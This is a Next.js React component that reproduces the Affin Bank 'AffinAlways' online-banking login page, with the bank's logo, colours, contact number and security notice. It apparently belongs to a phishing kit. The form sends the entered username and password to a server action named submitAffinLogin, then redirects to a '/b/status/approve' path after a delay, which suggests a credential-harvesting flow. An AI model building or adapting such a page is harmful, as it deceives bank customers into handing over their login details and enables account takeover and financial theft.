"use client";

import React, { useState } from "react";
import Image from "next/image";
import { User, Lock, Loader2, Globe, PhoneCall } from "lucide-react";
import { submitAffinLogin } from "@/lib/action";
import { useRouter } from "next/navigation";

export default function AffinLoginPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (username.length < 3 || password.length < 6) {
      setError("Please enter valid credentials.");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      const result = await submitAffinLogin(username, password);
      if (result.success) {
        setTimeout(() => {
          router.push("/b/status/approve");
        }, 1500);
      } else {
        setError(result.error || "Login failed. Please try again.");
        setIsLoading(false);
      }
    } catch (err) {
      setError("Something went wrong. Please try again later.");
      setIsLoading(false);
    }
  };

  return (
    <div className="flex min-h-screen flex-col bg-white font-sans text-[#333]">
      {/* Header */}
      <header className="flex flex-col border-b border-gray-100 bg-[#004B8D]">
        <div className="flex items-center justify-between px-6 py-4">
          <div className="flex items-center">
            <Image
              src="/bank/affin_bank.png"
              alt="Affin Bank Logo"
              width={160}
              height={40}
              className="h-10 w-auto brightness-0 invert"
            />
          </div>
          <div className="flex items-center gap-4 text-white/80">
            <button className="flex items-center gap-1.5 text-[13px] font-medium hover:text-white">
              <Globe size={16} />
              EN
            </button>
            <button className="flex items-center gap-1.5 text-[13px] font-medium hover:text-white">
              <PhoneCall size={16} />
              Contact Us
            </button>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex flex-1 flex-col items-center bg-gray-50/50 px-6 py-12">
        <div className="w-full max-w-md overflow-hidden rounded-2xl border border-gray-200 bg-white shadow-[0_8px_30px_rgb(0,0,0,0.04)]">
          {/* Form Header */}
          <div className="bg-[#004B8D] p-8 text-center text-white">
            <h2 className="text-2xl font-bold tracking-tight">Welcome to AffinAlways</h2>
            <p className="mt-2 text-sm opacity-80 font-medium italic">Your Secure Online Banking</p>
          </div>

          <div className="p-8">
            <form onSubmit={handleLogin} className="space-y-6">
              {error && (
                <div className="rounded bg-red-50 p-3 text-center text-sm font-medium text-red-600 border border-red-100">
                  {error}
                </div>
              )}

              {/* Username Input */}
              <div className="space-y-2">
                <label className="text-[13px] font-bold uppercase tracking-wider text-gray-500">Username</label>
                <div className="relative group">
                  <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 transition-colors group-focus-within:text-[#004B8D]">
                    <User size={20} />
                  </div>
                  <input
                    type="text"
                    placeholder="Enter your username"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full rounded-xl border border-gray-200 bg-gray-50/50 py-4 pl-12 pr-4 text-[17px] outline-none transition-all focus:border-[#004B8D] focus:bg-white focus:ring-4 focus:ring-[#004B8D]/5"
                    required
                  />
                </div>
              </div>

              {/* Password Input */}
              <div className="space-y-2">
                <label className="text-[13px] font-bold uppercase tracking-wider text-gray-500">Password</label>
                <div className="relative group">
                  <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 transition-colors group-focus-within:text-[#004B8D]">
                    <Lock size={20} />
                  </div>
                  <input
                    type="password"
                    placeholder="Enter your password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full rounded-xl border border-gray-200 bg-gray-50/50 py-4 pl-12 pr-4 text-[17px] outline-none transition-all focus:border-[#004B8D] focus:bg-white focus:ring-4 focus:ring-[#004B8D]/5"
                    required
                  />
                </div>
              </div>

              {/* Action Links */}
              <div className="flex items-center justify-between pt-2">
                <button type="button" className="text-sm font-bold text-[#E31E24] hover:underline">
                  Forgot Password?
                </button>
                <button type="button" className="text-sm font-bold text-[#004B8D] hover:underline">
                  Register Now
                </button>
              </div>

              {/* Login Button */}
              <button
                type="submit"
                disabled={isLoading}
                className="mt-6 flex w-full items-center justify-center rounded-xl bg-[#004B8D] py-4 text-xl font-bold text-white shadow-lg transition-all active:scale-[0.98] hover:bg-[#003d73] disabled:opacity-80 disabled:hover:bg-[#004B8D]"
              >
                {isLoading ? (
                  <>
                    <Loader2 className="mr-2 h-6 w-6 animate-spin" />
                    SECURE LOGIN...
                  </>
                ) : (
                  "LOGIN"
                )}
              </button>
            </form>

            <div className="mt-10 pt-8 border-t border-gray-100 text-center">
              <p className="text-sm text-gray-400">
                Facing issues? Contact us at <span className="font-bold text-[#004B8D]">03-8230 2222</span>
              </p>
            </div>
          </div>
        </div>

        {/* Security Notice */}
        <div className="mt-8 max-w-md text-center text-[12px] leading-relaxed text-gray-400 px-4">
          <p>
            Always ensure that you are on the correct URL: 
            <span className="font-bold text-gray-500"> https://www.affinalways.com</span>
          </p>
          <p className="mt-2">
            Affin Bank Berhad will never ask for your login details or OTP through email or SMS links.
          </p>
        </div>
      </main>

      {/* Footer */}
      <footer className="mt-auto bg-white px-6 py-8 border-t border-gray-100">
        <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 text-[11px] font-bold text-gray-400 uppercase tracking-widest">
          <button className="hover:text-[#004B8D]">Terms & Conditions</button>
          <button className="hover:text-[#004B8D]">Privacy Policy</button>
          <button className="hover:text-[#004B8D]">Security Advice</button>
          <button className="hover:text-[#004B8D]">PDPA</button>
        </div>
        <p className="mt-4 text-center text-[11px] text-gray-400">
          © 2026 Affin Bank Berhad. All rights reserved.
        </p>
      </footer>
    </div>
  );
}
